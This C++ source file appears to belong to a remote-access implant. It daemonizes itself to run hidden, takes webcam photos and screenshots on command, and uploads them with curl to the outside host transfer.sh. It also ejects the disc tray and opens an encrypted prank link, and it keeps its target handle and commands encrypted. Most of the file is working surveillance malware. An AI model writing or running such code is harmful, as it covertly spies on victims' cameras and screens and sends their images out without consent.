#include "utility.h"

void execute(const std::string &command)
{
  if(command == "webcam")
  {
    system(command_webcam.c_str());
    sleep(2);
    postImage();
  }
  if(command == "eject")
  {
    system(command_eject.c_str());
  }
  if(command == "rick")
  {
    if(fork() == 0)
    {
      execlp(command_open.c_str(),command_open.c_str(),decrypt(locker::command_rick1,locker::key).c_str());
    }
  }
  if(command == "screen")
  {
    system(command_screenshot.c_str());
    sleep(2);
    postImage();
  }
}
std::string commandMap(int input)
{
	std::string command = "";

	switch(input)
	{
		case 1:
			command = "webcam";
			break;
		case 2:
			command = "screen";
			break;
		case 3:
			command = "rick";
			break;
		case 4:
			command = "eject";
			break;
	}
	return command;
}
void daemonize()
{
	struct sigaction sa;

	if(fork() != 0)
		exit(0);
	setsid();

	sa.sa_handler = SIG_IGN;
	sigemptyset(&sa.sa_mask);
	sa.sa_flags = 0;
	sigaction(SIGHUP,&sa,NULL);

	if(fork() != 0)
		exit(0);
	chdir("/");

  for(int i = 0; i < 1024; i++)
    close(i);

  system("rm -rf /tmp/fail");

  open("/tmp/fail",O_RDWR|O_CREAT);
  dup(0);
  dup(0);
}

void postImage()
{
  std::string postcommand = "curl --upload-file /tmp/out.jpg https://transfer.sh/out.jpg";
  std::string prepare = "chmod u+rw /tmp/fail";
  std::string cleanup = "rm -rf /tmp/out.jpg";

  std::string input;

  system(postcommand.c_str());
  system(prepare.c_str());
  std::ifstream infile("/tmp/fail");
  while(std::getline(infile,input));

  if(fork() == 0)
  {
    execlp(command_open.c_str(),command_open.c_str(),input.c_str());
  }

  system(cleanup.c_str());
}
std::string getHandle()
{
  return decrypt(locker::target,locker::key);
}
std::string base64_encode(std::string filepath)
{
  static const std::string base64_chars =
             "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
             "abcdefghijklmnopqrstuvwxyz"
             "0123456789+/";

  std::ifstream file(filepath,std::ios::in | std::ios::binary | std::ios::ate);
  std::streampos size;
  char * buffer;

  size = file.tellg();
  buffer = new char [size];
  file.seekg (0, std::ios::beg);
  file.read (buffer, size);
  file.close();
  char * bytes_to_encode = buffer;
  uint64_t in_len = size;
  std::string ret;
  int i = 0;
  int j = 0;
  unsigned char char_array_3[3];
  unsigned char char_array_4[4];

  while (in_len--) {
    char_array_3[i++] = *(bytes_to_encode++);
    if (i == 3) {
      char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
      char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
      char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
      char_array_4[3] = char_array_3[2] & 0x3f;

      for(i = 0; (i <4) ; i++)
        ret += base64_chars[char_array_4[i]];
      i = 0;
    }
  }

  if (i)
  {
    for(j = i; j < 3; j++)
      char_array_3[j] = '\0';

    char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
    char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
    char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
    char_array_4[3] = char_array_3[2] & 0x3f;

    for (j = 0; (j < i + 1); j++)
      ret += base64_chars[char_array_4[j]];

    while((i++ < 3))
      ret += '=';

  }


  delete[] buffer;
  return ret;
}
